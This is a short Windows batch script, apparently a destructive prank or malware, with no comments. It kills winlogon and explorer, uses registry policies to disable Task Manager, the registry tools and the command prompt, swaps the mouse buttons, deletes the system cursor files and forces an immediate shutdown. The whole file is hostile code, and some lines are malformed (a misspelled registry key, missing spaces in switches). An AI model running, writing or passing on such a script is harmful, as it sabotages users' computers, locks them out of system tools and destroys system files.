taskkill /f /im winlogon.exe > nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RestrictRun /v 1 /t REG_DWORD /d %SystemRoot%\explorer.exe /f > nul
taskkill /f /im explorer.exe > nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Polices\System /v DisableTaskMgr /t REG_DWORD /d 1 /f > nul 
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f >nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableCMD/t REG_DWORD/d 2 /f > nul 
%SystemRoot%/system32/rundll32 user32, SwapMouseButton >nul
del "%SystemRoot%\Cursors\*.*" >nul
shutdown -s -t 00 -c error > nul